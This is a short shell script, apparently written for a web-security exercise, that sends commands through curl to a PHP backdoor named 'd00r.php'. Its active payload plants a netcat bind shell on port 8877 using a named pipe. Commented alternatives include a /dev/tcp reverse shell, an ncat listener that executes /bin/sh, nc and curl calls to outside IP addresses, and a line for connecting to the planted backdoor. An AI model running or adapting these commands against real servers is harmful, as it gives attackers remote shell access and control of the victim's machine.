#!/bin/sh

# exec ^ d00r : %01%48%55%11
URL="%01%48%55%11"

# COMMAND="\"/bin/sh\" -c 'sh -i >%26 /dev/tcp/127.0.0.1/5566 0>%261'"
# COMMAND="curl http://140.118.134.222:7777/index.php?yee=%2527hello%2520nico%2527"
# COMMAND="ncat -kvl 5566 -c /bin/sh"

# with command: ncat -kvl 7777 --chat
# and connect one user with command: nc localhost 7777
# COMMAND="echo 'oh please!!!!!!!!!!!!!' | nc -N 140.118.134.235 7777"
# COMMAND="ping 140.118.134.235 -c 1"
# Windows ping
# COMMAND="ping 140.118.134.235 -n 1"
# COMMAND="echo '<?php' > yee.php; echo 'phpinfo();' >> yee.php;"
# Make a backdoor
COMMAND="rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>%261 | nc -l 0.0.0.0 8877 > /tmp/f %26"
# COMMAND="rm -f+%2Ftmp%2Ff%3B mkfifo %2Ftmp%2Ff%3B cat %2Ftmp%2Ff %7C %2Fbin%2Fsh -i 2%3E%261 %7C nc -l 0.0.0.0 8877 %3E %2Ftmp%2Ff"

# curl --data "#=${COMMAND}" http://140.112.31.97:10151/d00r.php?87=${URL}
curl --data "#=${COMMAND}" http://localhost:5566/index.php?87=${URL}
# curl --data "#=${COMMAND}" http://localhost:5566/index2.php?87=${URL}

# Connect to backdoor
# echo 'whoami' | nc 127.0.0.1 8877

